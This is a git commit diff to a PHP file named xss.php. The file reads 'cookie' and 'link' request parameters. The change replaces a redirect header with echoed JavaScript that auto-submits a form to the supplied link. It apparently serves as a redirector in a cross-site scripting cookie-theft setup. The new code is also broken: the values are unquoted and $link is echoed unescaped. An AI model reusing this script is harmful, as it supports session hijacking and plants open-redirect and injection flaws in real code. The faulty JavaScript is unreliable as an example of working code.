71cb86b9f6549239056555ab3b091ea963d6e104
Federico <federicodebona@hotmail.it>
2019-12-13 08:43:05 +0100

    .

--- xss.php
+++ xss.php
@@ -1,5 +1,13 @@
 <?php
 $cookie = $_REQUEST['cookie'];
 $link = $_REQUEST['link'];
-header("Location : $link");
+echo "
+<script>
+const form = document.createElement('form');
+form.method = post;
+form.action = $link;
+document.body.appendChild(form);
+form.submit();
+</script>";
+
 ?>
